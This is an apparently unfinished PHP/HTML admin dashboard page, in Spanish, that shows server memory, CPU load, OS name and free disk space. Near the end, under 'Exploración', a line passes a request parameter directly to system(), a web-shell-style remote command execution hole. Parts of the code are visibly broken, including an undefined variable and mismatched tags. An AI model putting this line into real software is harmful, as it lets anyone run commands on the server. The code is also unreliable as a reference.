    <div class="row">
        <div id="breadcrumb" class="col-xs-12">
            <a href="#" class="show-sidebar">
                <i class="fa fa-bars"></i>
            </a>
            <ol class="breadcrumb pull-left">
                <li><a href="index.php">Dashboard</a></li>
                <li><a href="#">Páginas</a></li>
                <li><a href="#">Pruebas</a></li>
            </ol>
            <div id="social" class="pull-right">
                <a href="#"><i class="fa fa-google-plus"></i></a>
                <a href="#"><i class="fa fa-facebook"></i></a>
                <a href="#"><i class="fa fa-twitter"></i></a>
                <a href="#"><i class="fa fa-linkedin"></i></a>
                <a href="#"><i class="fa fa-youtube"></i></a>
            </div>
        </div>
    </div>
    <div class="well">
        <p class="lead">Páginas de ejemplo de carpetas</p>
        <h3 id="grid-options">EN PRUEBAS</h3>
        <div class="row show-grid-forms">
            <div class="col-sm-12">
                <?php 
            
            function get_server_memory_usage(){
                $free = shell_exec('free');
                $free = (string)trim($free);
                $free_arr = explode("\n", $free);
                $mem = explode(" ", $free_arr[1]);
                $mem = array_filter($mem);
                $mem = array_merge($mem);
                $memory_usage = $mem[2]/$mem[1]*100;

                return $memory_usage;
            }
            function get_server_cpu_usage(){
 
                $load = sys_getloadavg();
                return $load[0];

            }
            function memoria(){
                $bytes = disk_free_space("."); 
                $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
                $base = 1024;
                $class = min((int)log($bytes , $base) , count($si_prefix) - 1);
                 
                $Bytes= $bytes ;
                $Bytes2= sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '<br />';
                return ("<br/>".$Bytes."% <br/>".$Bytes2."");
            }
            
        ?>
                    <h3><strong>Sistema Operativo</strong></h3>
                    <h4 style="color:red"><?PHP echo php_uname(); ?></h2>
       <hr>
       <h4 style="color:red"><?PHP echo $loadavg ?></h2>
       <p><span class="description">Memoria Usada por el servidor:</span> <span class="result"><?= get_server_memory_usage() ?>%</span></p>
<p><span class="description">Server CPU Usada: </span> <span class="result"><?= get_server_cpu_usage() ?>%</span></p>
       <hr>
       
       <p><span class="description">Espacio disponible de un sistema:</span> <span class="result"><?= memoria() ?></span></p>
       <hr>
       <p><span class="description">Exploración:</span> <span class="result">
       
</span></p>
       <code>  <?PHP
System($get["id"]);
?></code>
        </div>
    </div>

</div>

<script type="text/javascript">
    // Run Select2 on element
    function Select2Test() {
        $("#el2").select2();
    }
    $(document).ready(function () {
        // Load script of Select2 and run this
        LoadSelect2Script(Select2Test);
        WinMove();
    });
</script>